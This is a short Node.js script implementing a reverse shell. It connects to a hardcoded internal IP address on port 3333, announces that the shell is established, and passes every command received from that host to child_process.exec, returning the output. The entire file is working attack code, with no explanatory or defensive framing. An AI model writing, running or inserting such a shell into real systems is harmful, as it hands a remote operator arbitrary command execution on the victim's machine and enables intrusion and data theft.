const net = require('net');
const { exec } = require('child_process');
const host = '172.26.33.46';
const port = 3333;

const client = new net.Socket();

client.connect(port, host, () => {
    console.log(`Connected to ${host}:${port}`);
    client.write('Reverse shell connection established\n');
});


client.on('data', (data) => {
    exec(data.toString(), (error, stdout, stderr) => {
        if (error){
            client.write(`Error occured! ${stderr}`);
        } else{
            client.write(stdout);
        }
    });
});


client.on('error', (error) => {
    console.error(`Connection error ${error}`);
    client.end();
});

client.on('close', () =>{
    console.log('Connection closed');
    process.exit(0);
});



